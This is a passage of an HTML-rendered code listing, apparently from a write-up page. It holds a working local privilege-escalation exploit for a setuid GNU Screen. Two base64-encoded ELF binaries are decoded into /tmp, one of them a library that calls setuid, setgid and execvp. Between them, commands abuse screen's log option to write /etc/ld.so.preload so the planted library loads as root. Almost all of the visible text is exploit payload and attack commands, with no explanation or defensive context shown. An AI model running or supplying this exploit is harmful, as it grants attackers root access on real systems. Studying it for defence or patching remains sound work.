class="line">GAAAAAAAAABAAAAAAwAAAAIAAAAAAAAAeAMAAAAAAAB4AwAAAAAAAI0AAAAAAAAAAAAAAAAAAAAB</span><br><span class="line">AAAAAAAAAAAAAAAAAAAASAAAAP&#x2F;&#x2F;&#x2F;28CAAAAAAAAAAYEAAAAAAAABgQAAAAAAAAUAAAAAAAAAAMA</span><br><span class="line">AAAAAAAAAgAAAAAAAAACAAAAAAAAAFUAAAD+&#x2F;&#x2F;9vAgAAAAAAAAAgBAAAAAAAACAEAAAAAAAAIAAA</span><br><span class="line">AAAAAAAEAAAAAQAAAAgAAAAAAAAAAAAAAAAAAABkAAAABAAAAAIAAAAAAAAAQAQAAAAAAABABAAA</span><br><span class="line">AAAAAMAAAAAAAAAAAwAAAAAAAAAIAAAAAAAAABgAAAAAAAAAbgAAAAQAAABCAAAAAAAAAAAFAAAA</span><br><span class="line">AAAAAAUAAAAAAABgAAAAAAAAAAMAAAAVAAAACAAAAAAAAAAYAAAAAAAAAHgAAAABAAAABgAAAAAA</span><br><span class="line">AAAAEAAAAAAAAAAQAAAAAAAAFwAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABzAAAAAQAA</span><br><span class="line">AAYAAAAAAAAAIBAAAAAAAAAgEAAAAAAAAFAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAA</span><br><span class="line">fgAAAAEAAAAGAAAAAAAAAHAQAAAAAAAAcBAAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAI</span><br><span class="line">AAAAAAAAAIcAAAABAAAABgAAAAAAAACAEAAAAAAAAIAQAAAAAAAAAAEAAAAAAAAAAAAAAAAAABAA</span><br><span class="line">AAAAAAAAAAAAAAAAAACNAAAAAQAAAAYAAAAAAAAAgBEAAAAAAACAEQAAAAAAAAkAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAEAAAAAAAAAAAAAAAAAAAAkwAAAAEAAAACAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAsAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAJsAAAABAAAAAgAAAAAAAAAsIAAAAAAAACwgAAAA</span><br><span class="line">AAAAJAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACpAAAAAQAAAAIAAAAAAAAAUCAAAAAA</span><br><span class="line">AABQIAAAAAAAAHwAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAswAAAA4AAAADAAAAAAAA</span><br><span class="line">AAg+AAAAAAAACC4AAAAAAAAQAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAL8AAAAPAAAA</span><br><span class="line">AwAAAAAAAAAYPgAAAAAAABguAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADL</span><br><span class="line">AAAABgAAAAMAAAAAAAAAID4AAAAAAAAgLgAAAAAAAMABAAAAAAAABAAAAAAAAAAIAAAAAAAAABAA</span><br><span class="line">AAAAAAAAggAAAAEAAAADAAAAAAAAAOA&#x2F;AAAAAAAA4C8AAAAAAAAgAAAAAAAAAAAAAAAAAAAACAAA</span><br><span class="line">AAAAAAAIAAAAAAAAANQAAAABAAAAAwAAAAAAAAAAQAAAAAAAAAAwAAAAAAAAOAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAgAAAAAAAAACAAAAAAAAADdAAAAAQAAAAMAAAAAAAAAOEAAAAAAAAA4MAAAAAAAAAgAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA4wAAAAgAAAADAAAAAAAAAEBAAAAAAAAAQDAAAAAA</span><br><span class="line">AAAIAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAOgAAAABAAAAMAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AEAwAAAAAAAAHwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAABgMAAAAAAAAPgEAAAAAAAAGgAAACwAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAWDUAAAAAAAC6AQAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEA</span><br><span class="line">AAADAAAAAAAAAAAAAAAAAAAAAAAAABI3AAAAAAAA8QAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAA</span><br><span class="line">AAAAAAA&#x3D;&quot; | base64 -d &gt; &#x2F;tmp&#x2F;libhax.so</span><br><span class="line">cd &#x2F;etc&#x2F;</span><br><span class="line">umask 000</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a&#x2F;tmp&#x2F;libhax.so&quot;</span><br><span class="line">screen -ls</span><br><span class="line">echo &quot;f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAkBAAAAAAAABAAAAAAAAAADA6AAAAAAAAAAAAAEAAOAAL</span><br><span class="line">AEAAHgAdAAYAAAAEAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAaAIAAAAAAABoAgAAAAAAAAgA</span><br><span class="line">AAAAAAAAAwAAAAQAAACoAgAAAAAAAKgCAAAAAAAAqAIAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA</span><br><span class="line">AAAAAAABAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgGAAAAAAAASAYAAAAAAAAAEAAA</span><br><span class="line">AAAAAAEAAAAFAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAATQIAAAAAAABNAgAAAAAAAAAQAAAA</span><br><span class="line">AAAAAQAAAAQAAAAAIAAAAAAAAAAgAAAAAAAAACAAAAAAAABQAQAAAAAAAFABAAAAAAAAABAAAAAA</span><br><span class="line">AAABAAAABgAAAOgtAAAAAAAA6D0AAAAAAADoPQAAAAAAAGgCAAAAAAAAcAIAAAAAAAAAEAAAAAAA</span><br><span class="line">AAIAAAAGAAAA+C0AAAAAAAD4PQAAAAAAAPg9AAAAAAAA4AEAAAAAAADgAQAAAAAAAAgAAAAAAAAA</span><br><span class="line">BAAAAAQAAADEAgAAAAAAAMQCAAAAAAAAxAIAAAAAAABEAAAAAAAAAEQAAAAAAAAABAAAAAAAAABQ</span><br><span class="line">5XRkBAAAAAwgAAAAAAAADCAAAAAAAAAMIAAAAAAAADwAAAAAAAAAPAAAAAAAAAAEAAAAAAAAAFHl</span><br><span class="line">dGQGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAUuV0</span><br><span class="line">ZAQAAADoLQAAAAAAAOg9AAAAAAAA6D0AAAAAAAAYAgAAAAAAABgCAAAAAAAAAQAAAAAAAAAvbGli</span><br><span class="line">NjQvbGQtbGludXgteDg2LTY0LnNvLjIABAAAABQAAAADAAAAR05VAPerCQU5uy56NgV4JBMk&#x2F;gDZ</span><br><span class="line">INC0BAAAABAAAAABAAAAR05VAAAAAAADAAAAAgAAAAAAAAACAAAACgAAAAEAAAAGAAAAAACBAAAA</span><br><span class="line">AAAKAAAAAAAAANFlzm0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXQAAACAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAANQAAABIAAAAAAAAAAAAAAAAAAAAAAAAAeQAAACAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">LgAAABIAAAAAAAAAAAAAAAAAAAAAAAAAGAAAABIAAAAAAAAAAAAAAAAAAAAAAAAAiAAAACAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAQAAABIAAAAAAAAAAAAAAAAAAAAAAAAACAAAABIAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAEAAAABIAAAAAAAAAAAAAAAAAAAAAAAAAHwAAACIAAAAAAAAAAAAAAAAAAAAAAAAAAHNl</span><br><span class="line">dHVpZABzZXRlZ2lkAHNldGV1aWQAZXhlY3ZwAF9fY3hhX2ZpbmFsaXplAHNldGdpZABfX2xpYmNf</span><br><span class="line">c3RhcnRfbWFpbgBsaWJjLnNvLjYAR0xJQkNfMi4yLjUAX0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRh</span><br><span class="line">YmxlAF9fZ21vbl9zdGFydF9fAF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAAAAAAAIAAAACAAIA</span><br><span class="line">AAACAAIAAgACAAEAAQBHAAAAEAAAAAAAAAB1GmkJAAACAFEAAAAAAAAA6D0AAAAAAAAIAAAAAAAA</span><br><span class="line">AHARAAAAAAAA8D0AAAAAAAAIAAAAAAAAADARAAAAAAAASEAAAAAAAAAIAAAAAAAAAEhAAAAAAAAA</span><br><span class="line">2D8AAAAAAAAGAAAAAQAAAAAAAAAAAAAA4D8AAAAAAAAGAAAAAgAAAAAAAAAAAAAA6D8AAAAAAAAG</span><br><span class="line">AAAAAwAAAAAAAAAAAAAA8D8AAAAAAAAGAAAABgAAAAAAAAAAAAAA+D8AAAAAAAAGAAAACgAAAAAA</span><br><span class="line">AAAAAAAAGEAAAAAAAAAHAAAABAAAAAAAAAAAAAAAIEAAAAAAAAAHAAAABQAAAAAAAAAAAAAAKEAA</span><br><span class="line">AAAAAAAHAAAABwAAAAAAAAAAAAAAMEAAAAAAAAAHAAAACAAAAAAAAAAAAAAAOEAAAAAAAAAHAAAA</span><br><span class="line">CQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiD7AhIiwXd</span><br><span class="line">LwAASIXAdAL&#x2F;0EiDxAjDAAAAAAAAAAAA&#x2F;zXiLwAA&#x2F;yXkLwAADx9AAP8l4i8AAGgAAAAA6eD&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line">JdovAABoAQAAAOnQ&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;yXSLwAAaAIAAADpwP&#x2F;&#x2F;&#x2F;&#x2F;8lyi8AAGgDAAAA6bD&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;JcIvAABoBAAA</span><br><span class="line">AOmg&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;yVyLwAAZpAAAAAAAAAAADHtSYnRXkiJ4kiD5PBQVEyNBZoBAABIjQ0zAQAASI09wQAA</span><br><span class="line">AP8VJi8AAPQPH0QAAEiNPYkvAABIjQWCLwAASDn4dBVIiwX+LgAASIXAdAn&#x2F;4A8fgAAAAADDDx+A</span><br><span class="line">AAAAAEiNPVkvAABIjTVSLwAASCn+SInwSMHuP0jB+ANIAcZI0f50FEiLBdUuAABIhcB0CP&#x2F;gZg8f</span><br><span class="line">RAAAww8fgAAAAACAPRkvAAAAdS9VSIM9ti4AAABIieV0DEiLPfouAADoLf&#x2F;&#x2F;&#x2F;+ho&#x2F;&#x2F;&#x2F;&#x2F;xgXxLgAA</span><br><span class="line">AV3DDx+AAAAAAMMPH4AAAAAA6Xv&#x2F;&#x2F;&#x2F;9VSInlvwAAAAC4AAAAAOjI&#x2F;v&#x2F;&#x2F;vwAAAAC4AAAAAOiZ&#x2F;v&#x2F;&#x2F;</span><br><span class="line">vwAAAAC4AAAAAOjK&#x2F;v&#x2F;&#x2F;vwAAAAC4AAAAAOir&#x2F;v&#x2F;&#x2F;ugAAAAC+AAAAAEiNPT4OAADodf7&#x2F;&#x2F;7gAAAAA</span><br><span class="line">XcNmLg8fhAAAAAAADx9AAEFXTI09&#x2F;ysAAEFWSYnWQVVJifVBVEGJ&#x2F;FVIjS3wKwAAU0wp&#x2F;UiD7Ajo</span><br><span class="line">8&#x2F;3&#x2F;&#x2F;0jB&#x2F;QN0GzHbDx8ATInyTInuRInnQf8U30iDwwFIOd116kiDxAhbXUFcQV1BXkFfww8fAMMA</span><br><span class="line">AABIg+wISIPECMMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span 